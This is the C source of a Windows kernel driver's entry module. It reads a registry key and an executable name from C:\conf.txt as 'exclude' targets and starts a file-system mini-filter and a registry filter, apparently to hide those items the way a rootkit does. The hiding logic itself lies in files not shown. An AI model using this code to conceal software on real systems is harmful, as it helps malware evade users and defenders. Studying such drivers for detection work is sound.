#include <fltKernel.h>
#include <Ntddk.h>
#include <stdlib.h>

#include "RegFilter.h"
#include "FsFilter.h"
#include "Driver.h"
#include "Helper.h"

#define DRIVER_ALLOC_TAG 'nddH'

PDRIVER_OBJECT g_driverObject = NULL;
volatile LONG g_driverActive = FALSE;
ULONGLONG g_hiddenRegConfigId = 0;
ULONGLONG g_hiddenDriverFileId = 0;
extern WCHAR g_excludeFile[BUFSIZE];
extern WCHAR g_excludeRegKey[BUFSIZE];
extern UNICODE_STRING us_excludeFile;
extern UNICODE_STRING us_excludeRegKey;

VOID EnableDisableDriver(BOOLEAN enabled)
{
	InterlockedExchange(&g_driverActive, (LONG)enabled);
}

BOOLEAN IsDriverEnabled()
{
	return (g_driverActive ? TRUE : FALSE);
}

// C:\conf.txt :
// <registry key>
// <exe name>
BOOLEAN readConfFile()
{
	UNICODE_STRING filename;
	OBJECT_ATTRIBUTES fileAttr;
	IO_STATUS_BLOCK fhStatus;
	HANDLE fh;
	NTSTATUS status;
	LARGE_INTEGER byteOffset;
	char cBuf[BUFSIZE] = { 0 }, *p = NULL;

	RtlInitUnicodeString(&filename, L"\\Device\\HarddiskVolume2\\conf.txt");

	InitializeObjectAttributes(&fileAttr, &filename, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

	status = ZwOpenFile(&fh, FILE_READ_DATA, &fileAttr, &fhStatus, 0, FILE_RANDOM_ACCESS);
	if (!NT_SUCCESS(status))
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Unable to read conf file: 0x%x. Reload driver\n", status);
		return FALSE;
	}

	byteOffset.LowPart = byteOffset.HighPart = 0;

	status = ZwReadFile(fh, NULL, NULL, NULL, &fhStatus, cBuf, BUFSIZE, &byteOffset, NULL);
	if (!NT_SUCCESS(status))
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Unable to read bitmap file [0x%x].\n", status);
		ZwClose(fh);
		return FALSE;
	}
	ZwClose(fh);

	p = cBuf;
	for (int i = 0; i < BUFSIZE && *p != '\n'; i++, p++);
	p--;
	*p = '\0';
	p += 2;
	mbstowcs(g_excludeRegKey, cBuf, strlen(cBuf) + 1);
	mbstowcs(g_excludeFile, p, strlen(p) + 1);
	
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "#%ws#\n", g_excludeRegKey);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "#%ws#\n", g_excludeFile);

	RtlInitUnicodeString(&us_excludeRegKey, g_excludeRegKey);
	RtlInitUnicodeString(&us_excludeFile, g_excludeFile);

	return TRUE;
}

_Function_class_(DRIVER_UNLOAD)
VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);

	DestroyRegistryFilter();
	DestroyFSMiniFilter();
}

_Function_class_(DRIVER_INITIALIZE)
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	NTSTATUS status;

	EnableDisableDriver(TRUE);

	if(!readConfFile())
		_InfoPrint("Error read conf file");

	status = InitializeFSMiniFilter(DriverObject);
	if (!NT_SUCCESS(status))
		_InfoPrint("Error, file-system mini-filter haven't started");

	status = InitializeRegistryFilter(DriverObject);
	if (!NT_SUCCESS(status))
		_InfoPrint("Error, registry filter haven't started");

	DriverObject->DriverUnload = DriverUnload;
	g_driverObject = DriverObject;

	return STATUS_SUCCESS;
}
